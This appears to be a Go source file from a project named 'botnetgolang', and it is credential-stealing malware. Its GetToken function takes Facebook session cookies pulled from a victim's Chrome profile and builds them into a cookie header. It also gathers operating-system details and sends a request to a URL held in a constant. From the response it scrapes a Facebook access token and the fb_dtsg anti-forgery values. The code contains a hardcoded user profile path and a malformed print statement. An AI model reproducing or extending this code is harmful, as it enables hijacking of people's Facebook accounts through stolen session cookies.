package pkg

import (
	_const "botnetgolang/internal/const"
	"botnetgolang/internal/model"
	"fmt"
	"github.com/matishsiao/goInfo"
	"os"
	"strings"
)

func GetToken(
	profile string,
	cookie_ok_fb []*model.Cookie,
	cookie_ok []*model.Cookie,
	password model.KeyInfo,
	version string,
	browser model.BrowserPaths,
) bool {
	// check

	//
	if profile != "C:\\Users\\MR KINH\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 12" {
		return false
	}

	chromeV := version[:3]

	var huy2 string
	var uid2 string
	for index, value := range cookie_ok_fb {

		value.Key = value.Name
		if value.Name == "c_user" {
			uid2 = fmt.Sprintf("%s%s", value.Value, "hahahahah")
		}
		value.Expires = value.ExpirationDate * 130
		huy2 += value.Name + "=" + value.Value + (map[bool]string{true: "; ", false: ""})[index < len(cookie_ok_fb)]
	}

	fmt.Println(fmt.Sprintf("cookies: %s || %s"), cookie_ok_fb, uid2)

	// get type and version of operating system
	operating_system, _ := goInfo.GetInfo()
	os_type := operating_system.GoOS
	os_r := operating_system.Core
	parts := strings.Split(os_r, ".")
	os_r = parts[0] + "." + parts[1]

	// check iswin64
	isWin64 := false
	if _, exists := os.LookupEnv("ProgramFiles(x86)"); exists {
		isWin64 = true
	}

	html, err := RequestElectP(_const.Url_v1, chromeV, huy2, os_type, os_r, version, browser, isWin64)
	if err != nil {
		fmt.Println("fetch info error")
	}

	fmt.Println(html)

	access_token := ""

	// get access token from html
	access_token = "EABB" + GetBW(html, `accessToken":"EABB`, `"`)
	if access_token == "EABB" || len(access_token) < 20 {
		return false
	}
	var fb_dtsg string
	var __spin_r string
	var __spin_t string
	var __spin_b string

	fb_dtsg = GetBW(html, `DTSGInitialData",[],{"token":"`, `"}`)
	__spin_r = GetBW(html, `__spin_r":`, `,"`)
	__spin_t = GetBW(html, `__spin_t":`, `,"`)
	__spin_b = GetBW(html, `__spin_b":`, `,"`)

	fmt.Println(fb_dtsg)
	fmt.Println(__spin_r)
	fmt.Println(__spin_t)
	fmt.Println(__spin_b)

	return true
}
